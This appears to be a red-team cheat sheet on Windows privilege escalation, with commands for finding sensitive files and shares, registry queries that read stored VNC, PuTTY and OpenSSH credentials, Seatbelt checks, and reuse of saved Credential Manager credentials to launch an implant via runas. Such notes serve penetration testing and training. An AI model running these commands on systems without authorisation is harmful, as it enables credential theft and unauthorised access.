# Windows Privilege Escalation Techniques

## Searching for sensitive filles

Start by searching for sensitive files on the local C drive. After that search any reachable network shares. [SharpShares](https://github.com/mitchmoser/SharpShares) can be used to search for open network shares.

```
dir /b /a /s c:\ > c-dirs.txt
```

```
SharpShares.exe /ldap:all /filter:sysvol,netlogon,ipc$,print$
```

Either extract the c-dirs.txt file onto your system and use your tool/text editor of choice to search for sensitive file. If you prefer to stay on the windows system and search through the file, use `type` and `findstr` to search for sensitive string.

```
type c-dirs.txt | findstr /i passw
```

## Registry Queries
Passwords for putty, vnc, and OpenSSH keys can be stored in the registry.

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\OpenSSH\Agent\Keys"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

SeatBelt can also be used to search through the registry.

```
Seatbelt.exe WindowsAutoLogon
Seatbelt.exe reg
```

## Credential Manager

Credentials stored in the windows credential manager can be abused to run commands or launch payloads as another users.

```
# List stored credentials
cmdkey /list

# User a stored credential
runas /savecred /user:admin implant.exe
```